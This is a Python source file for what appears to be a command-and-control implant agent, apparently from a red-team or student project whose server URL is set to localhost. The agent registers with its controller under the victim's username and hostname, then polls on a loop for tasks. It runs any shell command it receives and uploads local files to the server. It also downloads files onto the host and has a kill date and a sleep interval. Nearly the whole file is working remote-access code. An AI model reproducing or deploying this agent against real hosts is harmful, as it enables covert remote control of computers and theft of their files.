import getpass
import socket
import json
import requests
import base64
import datetime
import subprocess
import time
import os, tempfile
# variables that should be changed
# date in yyyy/mm/dd format
killdate= datetime.datetime(2021,12,14)
# Url used to connect to the server 
ServerUrl="http://localhost:8000/"
# number of seconds until the agent callsback to the server
sleep_interval=10

def checkDate(aKilldate):
    if(datetime.datetime.now() > aKilldate):
        exit()
# accepts a string name and uses to to 
def register(aName):
    data = {"name" : aName}
    data_json = json.dumps(data)
    headers = {'Content-type': 'application/json'}
    try:
        response = requests.post(ServerUrl+"api/register/", data=data_json, headers=headers)
    except requests.exceptions.ConnectionError:
        return -1
    if response.status_code ==201:
        return response.json()['id']
    else:
        return -1
def get_command(aId):
    response= requests.get(ServerUrl+"api/checkin/"+str(aId)+"/")
    if response.status_code==200:
        return response.json()
    else:
        return '{}'
    #print(response.content)
   # return response.json()
def execute_command(data):
    if data['CommandType']=='FileTransfer':
        if data['TransferLog']['direction']=='Download':
            path=data['TransferLog']['Path']
            log_id = data['id']
            filename = data['TransferLog']['FileName']
            try:
                Upload_file(log_id,filename,path)
                return "Success"
            except:
                return "Failed"
        if data['TransferLog']['direction']=='Upload':
            filename= data['TransferLog']['FileName']
            an_id =data['id']
            try:
                download_file(an_id,filename)
                return "Success" 
            except:
                return "Failed"
        #print("file transfer")
    if data['CommandType']=='ShellCommand':
        try:
            # parsed_command=data['Command'].split(' ')
            # print(parsed_command)
            # process=subprocess.check_output(parsed_command,shell=True)
            # return process
            cmd=data['Command'].split(' ')
            return subprocess.check_output(cmd,shell=False)
        except:
            return "Failed"
        #return subprocess.run(data['Command'].split(' '),capture_output=True,shell=True).stdout
        #return subprocess.check_output(data['Command'].split(' '),shell=True)

def download_file(command_id,filename):
    response= requests.get(ServerUrl+"api/AgentDownload/"+str(command_id)+"/")
    #filename=data['TransferLog']['FileName']

    path = os.path.join(tempfile.gettempdir(), filename)
    with open(path,"wb") as file:
        for chunk in response.iter_content(chunk_size=1024):
            if chunk:
                file.write(chunk)
def Upload_file(file_id,afile,path):
    files ={'file': open(str(path)+str(afile),'rb')}
    response= requests.post(ServerUrl+"api/upload/"+str(file_id)+"/",files=files)
def report_output(output,command_id):
    data={'output':output,'id': command_id }
    requests.post(ServerUrl+"api/agentreportoutput/",data=data)
# # def parseString(inputString):
#     output = inputString.split()
#     res = []
#     count = 0
#     temp = []
#     for word in output:
#         if (word.startswith('"')) and count % 2 == 0:
#             temp.append(word)
#             count += 1
#         elif count % 2 == 1 and not word.endswith('"'):
#             temp.append(word)
#         elif word.endswith('"'):
#             temp.append(word)
#             count += 1
#             tempWord = ' '.join(temp)
#             res.append(tempWord)
#             temp = []
#         else:
#             res.append(word)
#     return res
# main method
#has_registered=False
def main():
    agent_id = -1
    #derive agent name
    AgentName= getpass.getuser()+"@" + socket.gethostname()
    # getting registered 
    while(agent_id<0):
        checkDate(killdate)
        agent_id= register(AgentName)
        print(agent_id)
        time.sleep(sleep_interval)
    # query for commands
    while(True):
        checkDate(killdate)
        data=get_command(agent_id)
        if data !='{}':
            output=execute_command(data)
            print(output)
            report_output(output,data['id'])
        time.sleep(sleep_interval)
if __name__ == "__main__":
    main()




